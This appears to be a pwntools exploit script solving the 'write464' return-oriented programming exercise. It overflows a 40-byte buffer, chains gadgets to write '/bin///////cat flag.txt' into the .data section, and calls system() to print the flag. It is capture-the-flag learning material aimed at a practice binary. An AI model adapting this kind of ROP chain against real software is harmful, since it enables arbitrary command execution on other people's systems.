#!/usr/bin/env python2.7
# -*- coding: utf-8 -*-

from pwn import *


def get_section_addr(b, name):
    return b.get_section_by_name(name).header.sh_addr


def main():
    context(arch="amd64", os="linux", endian="little")
    e = ELF("./write464")
    rop = ROP([e])

    pop_pop = rop.find_gadget(["pop r14", "pop r15", "ret"])[0]
    pop = rop.find_gadget(["pop rdi", "ret"])[0]
    mov = 0x0000000000400820                                        # mov [r14], r15
    data = get_section_addr(e, '.data')
    system = e.plt['system']
    string = "/bin///////cat flag.txt" + "\x00"
    padding = "A" * 40

    rop.raw(p64(pop_pop) + p64(data) + string[:8])
    rop.raw(p64(mov))
    rop.raw(p64(pop_pop) + p64(data + 8) + string[8:16])
    rop.raw(p64(mov))
    rop.raw(p64(pop_pop) + p64(data + 16) + string[16:24])
    rop.raw(p64(mov))
    rop.raw(p64(pop) + p64(data))
    rop.raw(p64(system))

    p = process(['./write464'])
    msg = p.recv(timeout=0.1)
    print msg

    p.sendline(padding + str(rop))
    msg = p.recvuntil('}')
    print msg

    p.close()


if __name__ == "__main__":
    main()
